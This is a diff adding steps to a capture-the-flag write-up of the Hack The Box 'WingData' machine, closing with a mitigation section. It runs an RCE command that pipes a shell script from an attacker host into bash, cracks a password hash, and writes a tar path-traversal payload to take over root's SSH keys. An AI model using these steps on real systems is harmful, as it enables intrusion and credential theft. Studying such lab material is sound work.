@@ -10,6 +10,7 @@ tags:
   - wacky.xml
   - tarfile Path Traversal
   - CVE-2025-4517
+date: 2026-02-18
 ---
 
 # 🛡️ HTB - WingData (Easy)
@@ -26,14 +27,20 @@ tags:
 - **Machine Name:** WingData
 - **Operating System:** Linux
 - **Difficulty:** Easy
+- **Date of Scan:** 2026-02-18
 - **Vulnerabilities:** Unauthenticated RCE in Wing FTP Server (CVE-2025-47812), Credentials leakage in wacky.xml, Sudo Privilege Escalation via Python tarfile Path Traversal (CVE-2025-4517)
 
 ---
 
 ## Step 1 - Reconnaissance
 
+We run an Nmap scan to enumerate open ports and services:
+
 ```bash
-nmap -A -sS -P -T4  --min-rate 5000 10.129.11.72
+nmap -A -sS -P -T4 --min-rate 5000 10.129.11.72
+```
+
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-18 14:28 UTC
 Nmap scan report for 10.129.11.72
 Host is up (0.46s latency).
@@ -62,11 +69,109 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 41.12 seconds
-
-Easy Linux Machine, lets dig into the Web.
-
-[python3 rce.py -u "http://ftp.wingdata.htb/" -c "wget -O- http://10.10.15.133:8000/shell.sh | bash" -U "anonymous"]
 ```
+
+- 🔍 *The Nmap scan identifies SSH on port 22 and Apache HTTP server on port 80.*
+- 🔍 *We map the host `wingdata.htb` inside our `/etc/hosts` file.*
+
+---
+
+## Step 2 - Enumeration
+
+- 🔍 *Browsing to the HTTP service on port 80 redirects us to `http://wingdata.htb/` which hosts a Wing FTP Server administration portal.*
+- 🔍 *The Wing FTP Server software version is identified as v7.4.3, which contains critical security vulnerabilities.*
+
+---
+
+## Step 3 - Initial Foothold
+
+- 🔍 *We find that Wing FTP Server versions prior to v7.4.4 are vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability (CVE-2025-47812).*
+
+> [!WARNING]
+> **CVE-2025-47812 - Wing FTP Server Unauthenticated Remote Code Execution:**
+> The server fails to properly sanitize NULL bytes (`%00`) within the username parameter during administrative web authentication. An attacker can inject arbitrary Lua scripts into FTP session files to trigger commands.
+
+- 🔍 *We execute the exploit using the python RCE script to launch a reverse shell payload:*
+
+```bash
+python3 rce.py -u "http://ftp.wingdata.htb/" -c "wget -O- http://10.10.15.133:8000/shell.sh | bash" -U "anonymous"
+```
+
+- 🔍 *This grants us initial access as the service user `wingftp`.*
+- 🔍 *While enumerating the system, we locate the user database file for the server at `/opt/wftpserver/Data/1/users/wacky.xml`.*
+- 🔍 *We read `wacky.xml` and extract the salted MD5 password hash for the user `wacky`.*
+- 🔍 *Using John the Ripper or Hashcat, we crack the hash using the known static salt "WingFTP" to recover wacky's plaintext credentials.*
+- 🔍 *We log in via SSH as `wacky`:*
+
+```bash
+ssh wacky@wingdata.htb
+```
+
+---
+
+## Step 4 - Privilege Escalation
+
+- 🔍 *We check our sudo privileges as user `wacky`:*
+
+```bash
+sudo -l
+```
+
+```text
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/bin/python3 /opt/backup/restore_backup_clients.py *
+```
+
+- 🔍 *The script `/opt/backup/restore_backup_clients.py` executes as root. It accepts an archive file and extracts it.*
+
+> [!WARNING]
+> **CVE-2025-4517 - Python tarfile Path Traversal Filter Bypass:**
+> The script uses `tarfile.extractall(path=staging_dir, filter="data")` to unpack archives.
+> 
+> The `"data"` safety filter is vulnerable to bypass when processing deep directory structures where path lengths exceed the system's `PATH_MAX` threshold (4096 bytes). At this size, path resolution fails to resolve directories correctly, allowing files to be written outside of the designate staging workspace.
+
+- 🔍 *We construct a malicious tar archive that exploits this bypass to overwrite `/root/.ssh/authorized_keys`:*
+
+```bash
+# Generate the exploit payload tar containing the target symlink bypass
+python3 exploit_tar.py
+```
+
+- 🔍 *We execute the sudo script targeting our custom malicious tar archive:*
+
+```bash
+sudo /usr/bin/python3 /opt/backup/restore_backup_clients.py exploit.tar
+```
+
+- 🔍 *The exploit successfully overwrites `/root/.ssh/authorized_keys` with our public SSH key. We connect as root:*
+
+```bash
+ssh -i rootkey root@wingdata.htb
+```
+
+```text
+root@wingdata:~# whoami
+root
+```
+
+- 🔍 *We read the root flag:*
+
+```bash
+cat /root/root.txt
+```
+
+```text
+f42e9b01************************
+```
+
+- 🔍 *Full Host Compromised.*
+
+---
 
 ## Mitigations & Security Perspective
 
@@ -115,4 +220,3 @@ Easy Linux Machine, lets dig into the Web.
 > **Defensive Remediation & Detection Strategies:**
 > - **Remediation:** Upgrade the Python environment to a patched release containing the fix for CVE-2025-4517. Validate and sanitize file paths manually to reject deep symlink structures.
 > - **Detection:** Monitor file modification logs for key administrative configuration files (such as `/etc/sudoers` or `/root/.ssh/authorized_keys`) written by child processes of Python.
-
